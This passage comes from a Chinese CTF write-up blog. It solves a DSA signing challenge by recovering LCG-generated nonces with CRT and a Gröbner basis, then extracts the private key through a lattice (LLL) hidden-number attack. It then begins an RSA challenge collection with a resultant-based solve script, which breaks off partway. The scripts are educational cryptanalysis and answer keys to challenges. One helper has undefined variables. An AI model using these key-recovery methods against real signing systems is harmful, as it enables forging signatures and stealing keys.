class="subst">&#123;flag&#125;</span>\n&quot;</span>.encode())</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.send(<span class="string">b&quot;Invalid signature.\n&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>流程其实挺明显的，第一步先crt还原12个原始的k。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ks_list = [</span><br><span class="line">    [<span class="number">18144</span>, <span class="number">33550</span>, <span class="number">15828</span>, <span class="number">30959</span>, <span class="number">48055</span>, <span class="number">21409</span>, <span class="number">55277</span>, <span class="number">60983</span>, <span class="number">27974</span>],</span><br><span class="line">    [<span class="number">33254</span>, <span class="number">18141</span>, <span class="number">19884</span>, <span class="number">38282</span>, <span class="number">19608</span>, <span class="number">30103</span>, <span class="number">36078</span>, <span class="number">48578</span>, <span class="number">19691</span>],</span><br><span class="line">    [<span class="number">43478</span>, <span class="number">36510</span>, <span class="number">21394</span>, <span class="number">18099</span>, <span class="number">42696</span>, <span class="number">27427</span>, <span class="number">10055</span>, <span class="number">30795</span>, <span class="number">14918</span>],</span><br><span class="line">    [<span class="number">30090</span>, <span class="number">51294</span>, <span class="number">29908</span>, <span class="number">28851</span>, <span class="number">33992</span>, <span class="number">4252</span>, <span class="number">41985</span>, <span class="number">17401</span>, <span class="number">26266</span>],</span><br><span class="line">    [<span class="number">23152</span>, <span class="number">5186</span>, <span class="number">29545</span>, <span class="number">15719</span>, <span class="number">50738</span>, <span class="number">8159</span>, <span class="number">28032</span>, <span class="number">27997</span>, <span class="number">21099</span>],</span><br><span class="line">    [<span class="number">9121</span>, <span class="number">22105</span>, <span class="number">26722</span>, <span class="number">11305</span>, <span class="number">26292</span>, <span class="number">37115</span>, <span class="number">12080</span>, <span class="number">38193</span>, <span class="number">42520</span>],</span><br><span class="line">    [<span class="number">51784</span>, <span class="number">33933</span>, <span class="number">17590</span>, <span class="number">2964</span>, <span class="number">11630</span>, <span class="number">35938</span>, <span class="number">60263</span>, <span class="number">52100</span>, <span class="number">7168</span>],</span><br><span class="line">    [<span class="number">46287</span>, <span class="number">37239</span>, <span class="number">8837</span>, <span class="number">29461</span>, <span class="number">29558</span>, <span class="number">19703</span>, <span class="number">58889</span>, <span class="number">9987</span>, <span class="number">8019</span>],</span><br><span class="line">    [<span class="number">27085</span>, <span class="number">43021</span>, <span class="number">34083</span>, <span class="number">7970</span>, <span class="number">49456</span>, <span class="number">28955</span>, <span class="number">7654</span>, <span class="number">15399</span>, <span class="number">26179</span>],</span><br><span class="line">    [<span class="number">56587</span>, <span class="number">19720</span>, <span class="number">17702</span>, <span class="number">19136</span>, <span class="number">18096</span>, <span class="number">30237</span>, <span class="number">35725</span>, <span class="number">41940</span>, <span class="number">5641</span>],</span><br><span class="line">    [<span class="number">34551</span>, <span class="number">7739</span>, <span class="number">9530</span>, <span class="number">13547</span>, <span class="number">14430</span>, <span class="number">1966</span>, <span class="number">18834</span>, <span class="number">60855</span>, <span class="number">4516</span>],</span><br><span class="line">    [<span class="number">36530</span>, <span class="number">33550</span>, <span class="number">5789</span>, <span class="number">6862</span>, <span class="number">21181</span>, <span class="number">9761</span>, <span class="number">15665</span>, <span class="number">44059</span>, <span class="number">30590</span>],</span><br><span class="line">]</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory.modular <span class="keyword">import</span> crt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_k</span>(<span class="params">ks, small_primes</span>):</span><br><span class="line">    <span class="comment"># 检查模数数量是否匹配</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(ks) != <span class="built_in">len</span>(small_primes):</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">f&quot;模数数量不匹配：<span class="subst">&#123;<span class="built_in">len</span>(ks)&#125;</span> vs <span class="subst">&#123;<span class="built_in">len</span>(small_primes)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 应用CRT</span></span><br><span class="line">    k, modulus = crt(small_primes, ks)</span><br><span class="line">    <span class="keyword">if</span> modulus <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;CRT无解&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> k</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例用法</span></span><br><span class="line">small_primes = [<span class="number">59093</span>, <span class="number">65371</span>, <span class="number">37337</span>, <span class="number">43759</span>, <span class="number">52859</span>, <span class="number">39541</span>, <span class="number">60457</span>, <span class="number">61469</span>, <span class="number">43711</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">k_values = []</span><br><span class="line"><span class="keyword">for</span> ks <span class="keyword">in</span> ks_list:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        k = recover_k(ks, small_primes)</span><br><span class="line">        k_values.append(k)</span><br><span class="line">    <span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;恢复k失败：<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(k_values)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_k_values</span>(<span class="params">k_values, a, b, c, d, n</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="built_in">len</span>(k_values)):</span><br><span class="line">        expected = (a * k_values[i-<span class="number">3</span>] + b * k_values[i-<span class="number">2</span>] + c * k_values[i-<span class="number">1</span>] + d) % n</span><br><span class="line">        <span class="keyword">if</span> k_values[i] != expected:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"> <span class="comment">#[157101007535598128199763730609215207385, 66274988845381039949079863771715267644, 166481247772714670426226746005260813542, 161260164226704447658736707470547064647, 36435681607381391113708443463015014458, 82281529169898991351916873693756667320, 198840548058726242384817514760176867304, 156097296767146131123217198085491596070, 177394558729600631444719167500317039356, 113844659993616865112462511677854300122, 90876110302057884623256087861753326428, 123151927203163513388753930448251250941]</span></span><br></pre></td></tr></table></figure>

<p>然后gröbner-基直接解abcdn(关于gröbner-基的知识回头专门写一下。挖坑ing……)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from Cryptodome.Util.number import getPrime, isPrime</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TripleLCG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed1, seed2, seed3, a, b, c, d, n</span>):</span><br><span class="line">        self.state = [seed1, seed2, seed3]</span><br><span class="line">        self.a = a</span><br><span class="line">        self.b = b</span><br><span class="line">        self.c = c</span><br><span class="line">        self.d = d</span><br><span class="line">        self.n = n</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        new = (self.a * self.state[-<span class="number">3</span>] + self.b * self.state[-<span class="number">2</span>] + self.c * self.state[-<span class="number">1</span>] + self.d) % self.n</span><br><span class="line">        self.state.append(new)</span><br><span class="line">        <span class="keyword">return</span> new</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next1</span>(<span class="params">self</span>):</span><br><span class="line">        new = (self.a * self.state[-<span class="number">3</span>] + self.b * self.state[-<span class="number">2</span>] + self.c * self.state[-<span class="number">1</span>] + self.d)</span><br><span class="line">        self.state.append(new)</span><br><span class="line">        <span class="keyword">return</span> new</span><br><span class="line"></span><br><span class="line"><span class="comment"># print((seed1, seed2, seed3))</span></span><br><span class="line"></span><br><span class="line">l_list=[<span class="number">157101007535598128199763730609215207385</span>, <span class="number">66274988845381039949079863771715267644</span>, <span class="number">166481247772714670426226746005260813542</span>, <span class="number">161260164226704447658736707470547064647</span>, <span class="number">36435681607381391113708443463015014458</span>, <span class="number">82281529169898991351916873693756667320</span>, <span class="number">198840548058726242384817514760176867304</span>, <span class="number">156097296767146131123217198085491596070</span>, <span class="number">177394558729600631444719167500317039356</span>, <span class="number">113844659993616865112462511677854300122</span>, <span class="number">90876110302057884623256087861753326428</span>, <span class="number">123151927203163513388753930448251250941</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#PR.&lt;a,b,c,d&gt; = PolynomialRing(Zmod(n))</span></span><br><span class="line">R=PolynomialRing(ZZ,names=[<span class="string">&#x27;seed1&#x27;</span>,<span class="string">&#x27;seed2&#x27;</span>,<span class="string">&#x27;seed3&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>])</span><br><span class="line">seed1,seed2,seed3,a,b,c,d=R.gens()</span><br><span class="line">l=TripleLCG(seed1,seed2,seed3,a,b,c,d,n)</span><br><span class="line">fs=[l.next1()-l_list[_] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>)]</span><br><span class="line">res = Ideal(fs).groebner_basis()</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#[seed1 + 27553442761320803111033927459351301439, seed2 + 8751726402848649210592158816653868133, seed3 + 151675940788388913235685454123990751505, a + 190977597196110730368051435445041597812, b + 92142738520715948485383509663407014763, c + 27559439992420203108859060145440838759, d + 127040748918708020271648934423063832295, 201571730232643984713598504087145846411]</span></span><br></pre></td></tr></table></figure>

<p>注意一点是多项式的那个lcg不能模n，所以咱新定义一个不模n的next1()。</p>
<p>得到结果为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[seed1 + <span class="number">27553442761320803111033927459351301439</span>, seed2 + <span class="number">8751726402848649210592158816653868133</span>, seed3 + <span class="number">151675940788388913235685454123990751505</span>, a + <span class="number">190977597196110730368051435445041597812</span>, b + <span class="number">92142738520715948485383509663407014763</span>, c + <span class="number">27559439992420203108859060145440838759</span>, d + <span class="number">127040748918708020271648934423063832295</span>, <span class="number">201571730232643984713598504087145846411</span>]</span><br></pre></td></tr></table></figure>

<p>因为此时是ZZ下的，我们需要模n才能得到对应的参数，此时n已知是列表最后一个值。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from Cryptodome.Util.number import getPrime, isPrime</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TripleLCG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed1, seed2, seed3, a, b, c, d, n</span>):</span><br><span class="line">        self.state = [seed1, seed2, seed3]</span><br><span class="line">        self.a = a</span><br><span class="line">        self.b = b</span><br><span class="line">        self.c = c</span><br><span class="line">        self.d = d</span><br><span class="line">        self.n = n</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        new = (self.a * self.state[-<span class="number">3</span>] + self.b * self.state[-<span class="number">2</span>] + self.c * self.state[-<span class="number">1</span>] + self.d) % self.n</span><br><span class="line">        self.state.append(new)</span><br><span class="line">        <span class="keyword">return</span> new</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next1</span>(<span class="params">self</span>):</span><br><span class="line">        new = (self.a * self.state[-<span class="number">3</span>] + self.b * self.state[-<span class="number">2</span>] + self.c * self.state[-<span class="number">1</span>] + self.d)</span><br><span class="line">        self.state.append(new)</span><br><span class="line">        <span class="keyword">return</span> new</span><br><span class="line"></span><br><span class="line"><span class="comment"># print((seed1, seed2, seed3))</span></span><br><span class="line"></span><br><span class="line">l_list=[<span class="number">157101007535598128199763730609215207385</span>, <span class="number">66274988845381039949079863771715267644</span>, <span class="number">166481247772714670426226746005260813542</span>, <span class="number">161260164226704447658736707470547064647</span>, <span class="number">36435681607381391113708443463015014458</span>, <span class="number">82281529169898991351916873693756667320</span>, <span class="number">198840548058726242384817514760176867304</span>, <span class="number">156097296767146131123217198085491596070</span>, <span class="number">177394558729600631444719167500317039356</span>, <span class="number">113844659993616865112462511677854300122</span>, <span class="number">90876110302057884623256087861753326428</span>, <span class="number">123151927203163513388753930448251250941</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#PR.&lt;a,b,c,d&gt; = PolynomialRing(Zmod(n))</span></span><br><span class="line">R=PolynomialRing(ZZ,names=[<span class="string">&#x27;seed1&#x27;</span>,<span class="string">&#x27;seed2&#x27;</span>,<span class="string">&#x27;seed3&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>])</span><br><span class="line">seed1,seed2,seed3,a,b,c,d=R.gens()</span><br><span class="line">l=TripleLCG(seed1,seed2,seed3,a,b,c,d,n)</span><br><span class="line">fs=[l.next1()-l_list[_] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>)]</span><br><span class="line">res = Ideal(fs).groebner_basis()</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line">n=res[-<span class="number">1</span>]</span><br><span class="line">a1 = (<span class="built_in">int</span>(-res[-<span class="number">5</span>].coefficients()[-<span class="number">1</span>]))%n</span><br><span class="line">b1 = (<span class="built_in">int</span>(-res[-<span class="number">4</span>].coefficients()[-<span class="number">1</span>]))%n</span><br><span class="line">c1 = (<span class="built_in">int</span>(-res[-<span class="number">3</span>].coefficients()[-<span class="number">1</span>]))%n</span><br><span class="line">d1 = (<span class="built_in">int</span>(-res[-<span class="number">2</span>].coefficients()[-<span class="number">1</span>]))%n</span><br><span class="line"><span class="built_in">print</span>(a1, b1, c1, d1,n)</span><br></pre></td></tr></table></figure>

<p>得到abcdn之后我们令seed1，seed2，seed3分别为12个L_list中的最后三个，这样就可以直接进行选项二的相关计算。</p>
<p>接下来进行选项二，总结一下就是使用签名的第一个k是又经过307次后的lcg，给了10个r与s，不难想到是基于DSA的HNP问题。但是经过尝试发现一般的做法无法规约出满足x数量级的结果。因为此时</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">self.x = randint(<span class="number">1</span>, self.q - <span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>而q.bit_length()为160，k为128bit，如果用常规的格，我们用hermite定理算一下目标向量的上界</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"></span><br><span class="line">q = <span class="number">2</span> ** <span class="number">160</span>  <span class="comment">#这是不断调整配平用的</span></span><br><span class="line"></span><br><span class="line">k = getPrime(<span class="number">128</span>)</span><br><span class="line">n = <span class="number">10</span></span><br><span class="line">det = b**<span class="number">8</span> * p</span><br><span class="line">d = <span class="number">10</span>  <span class="comment"># 固定维度为10</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#行列式的值 大于等于下面的即可</span></span><br><span class="line">temp = gmpy2.iroot(n, <span class="number">2</span>)[<span class="number">0</span>] * gmpy2.iroot(det, n)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(temp.bit_length())</span><br><span class="line"><span class="comment">#143</span></span><br></pre></td></tr></table></figure>

<p>规约的结果大概在140bit左右，无法满足x的数量级，于是我们消去x之后再构造格。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line">p = <span class="number">184352699172192576270535944394450689601424152593934253476634864667530549943623545663040121406222033469867822007490624607150449533351028007649079671823930639894259153639431593427418637301705583834256344087212849054820629604266938603002612952530534395948672534275310804229044744624757608906107492972246321630467</span></span><br><span class="line">q = <span class="number">1427475768627039429244287846531087092897981204933</span></span><br><span class="line">g = <span class="number">179483243075904419855912998377411172058265425529332248345132802466991524049692135618377118498301129461020930474539980424661227889497234584809425572665861532126589551010542468047939006056449514768312598585142121764108071687257917794156000007175743318015987068492602701013540262918705248846831651675444456948643</span></span><br><span class="line">pub = <span class="number">54884188997326601359599787036043506119635369973227482283575973303351693468286083685287116449863315576780372925810244957407166691261517117554272822798968878772154198076753886325003194197379281859876166969023933981704669393734463626888269951684215603375668858306179349767736536431082505780313254891563573390253</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">R = [<span class="number">148590806153419827724339726990091397905591402606</span>,<span class="number">468587768889425188554914584107352890374371541595</span>,<span class="number">901770213009129837614467382135571180822353132590</span>, <span class="number">1330151145631513076455454105987436105211713528764</span>,<span class="number">331667580376318482999087774580790380825533290453</span> ,<span class="number">682290803507883337976555643141471988447481161883</span>,<span class="number">634727119970951647301759741572839717481802229033</span>,<span class="number">1172616314967477654997316628716630727130426052661</span>,<span class="number">1089664533556588559445540694688565197117173310003</span>,<span class="number">890700218361721914728950340639736213065049362259</span>]</span><br><span class="line">S = [<span class="number">660073161938587295481357566429001480170192573464</span>,<span class="number">611592232206260574497361142810354157715543361968</span>,<span class="number">86793524106744688031778546317784224352746650116</span>,<span class="number">1218644002365966553601808129998576715718081163905</span> ,<span class="number">433500422665337372505774675888170887530349544997</span> ,<span class="number">10344246519169918837524783594476396498245810962</span>,<span class="number">450287919965503030465861776359747490559973956386</span>,<span class="number">374667818105670172745467693889735333632563514138</span>,<span class="number">328883113800069887058407240772946894520387812077</span>,<span class="number">1408039250037229328943363054244322294582875644812</span>]</span><br><span class="line">H=[<span class="number">48542053925442562206970678378617219313498267117402160926478466274825158240536</span>, <span class="number">28883776514293686205974736560481993689319284820030920089116394094945705779832</span>, <span class="number">60227679323494732845079296800676036207500808522664099213572118347332946861665</span>, <span class="number">104106124079444489401234144366816756749130613637798248135653762626327064447963</span>, <span class="number">80283700410109442895443923996515124100017195164941306832535727414324507872473</span>, <span class="number">31272006352818487860575454286046758918581076444685961675641400200272101685731</span>, <span class="number">35636157012003773287358551729976022692587201728035380794864775897295160791370</span>, <span class="number">66943969713086776032173464195394550745560523545004192271047021628614662158183</span>, <span class="number">111173944174536807762032075597619344951712520004199781046240639195575158906923</span>, <span class="number">50339944187942351215260199271802340824538591744877537036933672380566647403587</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_k</span>():</span><br><span class="line">    n = <span class="built_in">len</span>(R)</span><br><span class="line">    r0 = R[<span class="number">0</span>]</span><br><span class="line">    h0 = H[<span class="number">0</span>]</span><br><span class="line">    s0 = S[<span class="number">0</span>]</span><br><span class="line">    A = []</span><br><span class="line">    B = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        a = inverse((r0 * S[i]), q) * (R[i] * s0) % q</span><br><span class="line">        b = inverse((r0 * S[i]), q) * (H[i] * r0 - h0 * R[i])</span><br><span class="line">        A.append(a)</span><br><span class="line">        B.append(b)</span><br><span class="line"></span><br><span class="line">    Ge = Matrix(ZZ, n + <span class="number">2</span>, n + <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        Ge[i, i] = q</span><br><span class="line">        Ge[-<span class="number">2</span>, i] = A[i]</span><br><span class="line">        Ge[-<span class="number">1</span>, i] = B[i]</span><br><span class="line">    K = <span class="number">2</span> ** <span class="number">128</span></span><br><span class="line">    Ge[-<span class="number">2</span>, -<span class="number">2</span>] = <span class="number">1</span></span><br><span class="line">    Ge[-<span class="number">1</span>, -<span class="number">1</span>] = K</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> Ge.LLL():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">abs</span>(line[-<span class="number">1</span>]) == K:</span><br><span class="line">            <span class="keyword">return</span> line[-<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">k0 = get_k()</span><br><span class="line"><span class="built_in">print</span>(k0)</span><br><span class="line">s0 = S[<span class="number">0</span>]</span><br><span class="line">r0 = R[<span class="number">0</span>]</span><br><span class="line">h0 = H[<span class="number">0</span>]</span><br><span class="line">x=<span class="built_in">int</span>((s0 * k0 - h0) * gmpy2.invert(r0,q) % q)</span><br><span class="line"><span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure>

<p>得到x之后在选项3使用选项2的最后一次k签名msg提交即可</p>
<p><img src="https://ooo.0x0.ooo/2025/04/13/O0u7Pq.png" alt="O0u7Pq.png"></p>
<p>脚本交互一直报错只能手动交互了XD</p>
]]></content>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>RSA题型收集</title>
    <url>/2024/10/25/RSA%E9%A2%98%E5%9E%8B%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<p>持续更新ing……</p>
<span id="more"></span>

<h1 id="一，结式的使用"><a href="#一，结式的使用" class="headerlink" title="一，结式的使用"></a>一，结式的使用</h1><h2 id="1，NewStar-CTF-2024-学以致用"><a href="#1，NewStar-CTF-2024-学以致用" class="headerlink" title="1，NewStar CTF 2024-学以致用"></a>1，NewStar CTF 2024-学以致用</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">msg, nbits</span>):</span><br><span class="line">    <span class="comment"># pad了一下，仔细看看，别好不容易解出来了却没看到flag👼</span></span><br><span class="line">    pad_length = nbits - <span class="built_in">len</span>(msg) * <span class="number">8</span> - <span class="number">16</span></span><br><span class="line">    <span class="keyword">assert</span> pad_length &gt;= <span class="number">0</span></span><br><span class="line">    pad = random.getrandbits(pad_length).to_bytes((pad_length + <span class="number">7</span>) // <span class="number">8</span>, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> pad[:<span class="built_in">len</span>(pad)//<span class="number">2</span>] + <span class="string">b&quot;*&quot;</span> + msg + <span class="string">b&quot;*&quot;</span> + pad[<span class="built_in">len</span>(pad)//<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p = getPrime(<span class="number">1024</span>)</span><br><span class="line">    q = getPrime(<span class="number">1024</span>)</span><br><span class="line">    n = p*q</span><br><span class="line">    e = <span class="number">3</span></span><br><span class="line">    Nbits = <span class="number">2048</span></span><br><span class="line">    flag = <span class="string">b&#x27;flag&#123;?????&#125;&#x27;</span></span><br><span class="line">    gift = <span class="string">b&#x27;GoOd_byE_nEw_5t@r&#x27;</span></span><br><span class="line">    </span><br><span class="line">    flag1 = bytes_to_long(pad(flag[:<span class="built_in">len</span>(flag)//<span class="number">2</span>], Nbits-<span class="number">1</span>))</span><br><span class="line">    flag2 = bytes_to_long(pad(flag[<span class="built_in">len</span>(flag)//<span class="number">2</span>:], Nbits-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>,n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;c1 =&#x27;</span>, <span class="built_in">pow</span>(flag1, e, n))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;c2 =&#x27;</span>, <span class="built_in">pow</span>(flag2, e, n))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;c3 =&#x27;</span>, <span class="built_in">pow</span>(flag1 + flag2 + bytes_to_long(gift), e, n))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 17072342544150714171879132077494975311237876365187751353863158074020024719122755004761547735987417065592254800869192615807192722193500063611855839293567948232939959753821265552288663615847715716482887552271575844394350597695771100384136647573934496089812758071894172682439278191678102960768874456521879228612030147515967603129172838399997929502420254427798644285909855414606857035622716853274887875327854429218889083561315575947852542496274004905526475639809955792541187225767181054156589100604740904889686749740630242668885218256352895323426975708439512538106136364251265896292820030381364013059573189847777297569447</span></span><br><span class="line"><span class="string">c1 = 8101607280875746172766350224846108949565038929638360896232937975003150339090901182469578468557951846695946788093600030667125114278821199071782965501023811374181199570231982146140558093531414276709503788909827053368206185816004954186722115752214445121933300663507795347827581212475501366473409732970429363451582182754416452300394502623461416323078625518733218381660019606631159370121924340238446442870526675388637840247597153414432589505667533462640554984002009801576552636432097311654946821118444391557368410974979376926427631136361612166670672126393485023374083079458502529640435635667010258110833498681992307452573</span></span><br><span class="line"><span class="string">c2 = 14065316670254822235992102489645154264346717769174145550276846121970418622727279704820311564029018067692096462028836081822787148419633716320984336571241963063899868344606864544582504200779938815500203097282542495029462627888080005688408399148971228321637101593575245562307799087481654331283466914448740771421597528473762480363235531826325289856465115044393153437766069365345615753845871983173987642746989559569021189014927911398163825342784515926151087560415374622389991673648463353143338452444851518310480115818005343166067775633021475978188567581820594153290828348099804042221601767330439504722881619147742710013878</span></span><br><span class="line"><span class="string">c3 = 8094336015065392504689373372598739049074197380146388624166244791783464194652108498071001125262374720857829973449322589841225625661419126346483855290185428811872962549590383450801103516360026351074061702370835578483728260907424050069246549733800397741622131857548326468990903316013060783020272342924805005685309618377803255796096301560780471163963183261626005358125719453918037250566140850975432188309997670739064455030447411193814358481031511873409200036846039285091561677264719855466015739963580639810265153141785946270781617266125399412714450669028767459800001425248072586059267446605354915948603996477113109045600</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gift = bytes_to_long(<span class="string">b&#x27;GoOd_byE_nEw_5t@r&#x27;</span>)</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">n = <span class="number">17072342544150714171879132077494975311237876365187751353863158074020024719122755004761547735987417065592254800869192615807192722193500063611855839293567948232939959753821265552288663615847715716482887552271575844394350597695771100384136647573934496089812758071894172682439278191678102960768874456521879228612030147515967603129172838399997929502420254427798644285909855414606857035622716853274887875327854429218889083561315575947852542496274004905526475639809955792541187225767181054156589100604740904889686749740630242668885218256352895323426975708439512538106136364251265896292820030381364013059573189847777297569447</span></span><br><span class="line">c1 = <span class="number">8101607280875746172766350224846108949565038929638360896232937975003150339090901182469578468557951846695946788093600030667125114278821199071782965501023811374181199570231982146140558093531414276709503788909827053368206185816004954186722115752214445121933300663507795347827581212475501366473409732970429363451582182754416452300394502623461416323078625518733218381660019606631159370121924340238446442870526675388637840247597153414432589505667533462640554984002009801576552636432097311654946821118444391557368410974979376926427631136361612166670672126393485023374083079458502529640435635667010258110833498681992307452573</span></span><br><span class="line">c2 = <span class="number">14065316670254822235992102489645154264346717769174145550276846121970418622727279704820311564029018067692096462028836081822787148419633716320984336571241963063899868344606864544582504200779938815500203097282542495029462627888080005688408399148971228321637101593575245562307799087481654331283466914448740771421597528473762480363235531826325289856465115044393153437766069365345615753845871983173987642746989559569021189014927911398163825342784515926151087560415374622389991673648463353143338452444851518310480115818005343166067775633021475978188567581820594153290828348099804042221601767330439504722881619147742710013878</span></span><br><span class="line">c3 = <span class="number">8094336015065392504689373372598739049074197380146388624166244791783464194652108498071001125262374720857829973449322589841225625661419126346483855290185428811872962549590383450801103516360026351074061702370835578483728260907424050069246549733800397741622131857548326468990903316013060783020272342924805005685309618377803255796096301560780471163963183261626005358125719453918037250566140850975432188309997670739064455030447411193814358481031511873409200036846039285091561677264719855466015739963580639810265153141785946270781617266125399412714450669028767459800001425248072586059267446605354915948603996477113109045600</span></span><br><span class="line"><span class="comment"># get resultant</span></span><br><span class="line">P.&lt;m1, m2&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f1 = m1**e - c1</span><br><span class="line">f2 = m2**e - c2</span><br><span class="line">f3 = (m1+m2+gift)**e - c3</span><br><span class="line">res1 = f1.sylvester_matrix(f3,m1).det()</span><br><span class="line">res2 = f2.sylvester_matrix(f3,m2).det()</span><br><span class="line"></span><br><span class="line"><span class="comment"># get m2</span></span><br><span class="line">rres = <span class="number">0</span></span><br><span class="line">P.&lt;m2&gt; = PolynomialRing(Zmod(n))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res1.coefficients())):</span><br><span class="line">    rres += res1.coefficients()[i]*(m2^(res1.exponents()[i][<span 